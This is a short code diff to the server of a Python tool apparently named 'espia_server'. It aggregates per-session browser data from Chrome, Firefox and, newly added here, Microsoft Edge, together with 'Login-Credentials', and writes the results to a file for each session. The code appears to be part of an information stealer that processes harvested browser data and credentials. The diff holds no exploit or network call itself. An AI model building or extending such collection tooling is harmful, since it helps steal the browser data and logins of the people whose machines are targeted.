@@ -4,7 +4,7 @@ import pathlib
 
 from colored import fg
 
-from espia_server.app.plugins.chrome.chrome_handler import handle_all_chrome_modules
+from espia_server.app.plugins.chromium.chromium_handler import handle_all_chromium_modules
 from espia_server.app.plugins.firefox.firefox_handler import handle_all_firefox_modules
 
 # For output purposes
@@ -15,6 +15,7 @@ data = fg('dark_green_sea')
 
 _FINAL_PRODUCT_STRUCT = {
     "Chrome": {},
+    "Edge": {},
     "Firefox": {},
     "Login-Credentials": {}
 }
@@ -47,7 +48,8 @@ def handle_products_results(session_id: str, results: dict) -> None:
     :param results: dict of retrieved product
     """
     final_product = _FINAL_PRODUCT_STRUCT
-    final_product["Chrome"] = handle_all_chrome_modules(results)
+    final_product["Chrome"] = handle_all_chromium_modules(results, "Chrome")
+    final_product["Edge"] = handle_all_chromium_modules(results, "Edge")
     final_product["Firefox"] = handle_all_firefox_modules(uploads_path / session_id, results)
     final_product["Login-Credentials"] = results.get("Login-Credentials")
     write_final_product_to_file(session_id, final_product)
